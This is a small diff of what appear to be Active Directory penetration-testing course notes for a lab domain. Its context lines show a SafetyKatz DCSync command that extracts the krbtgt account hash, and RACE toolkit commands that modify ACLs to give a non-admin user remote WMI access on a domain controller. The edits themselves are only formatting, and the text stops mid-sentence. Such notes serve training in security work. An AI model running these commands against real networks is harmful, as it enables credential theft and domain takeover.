@@ -598,13 +598,12 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 # **Using ACLs - Security Descriptors - WMI**
 
 
-ACLs can be modified to allow non-admin users access to securable objects. Using the RACE
-toolkit:
+- ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
 
 
 
 ```powershell
-# First of all run-:
+# First of all run to -:
 
 C:\AD\Tools\RACE-master\RACE.ps1
 
@@ -626,4 +625,6 @@ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\ci
 ```
 
 
+**Example**
 
+- After running the 
